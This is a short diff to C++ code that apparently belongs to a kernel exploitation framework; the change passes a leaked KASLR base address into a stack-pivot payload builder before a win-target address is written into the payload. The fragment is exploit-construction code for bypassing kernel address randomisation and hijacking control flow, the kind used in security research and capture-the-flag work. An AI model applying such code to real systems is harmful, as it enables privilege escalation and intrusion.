@@ -33,7 +33,7 @@ public:
 
         auto& kpwn = env->GetKpwn();
         auto kaslr = kpwn.KaslrLeak();
-        pivot.ApplyToPayload(p);
+        pivot.ApplyToPayload(p, kaslr);
 
         auto offs = pivot.GetDestinationOffset();
         p.Set(offs, kpwn.WinTarget());
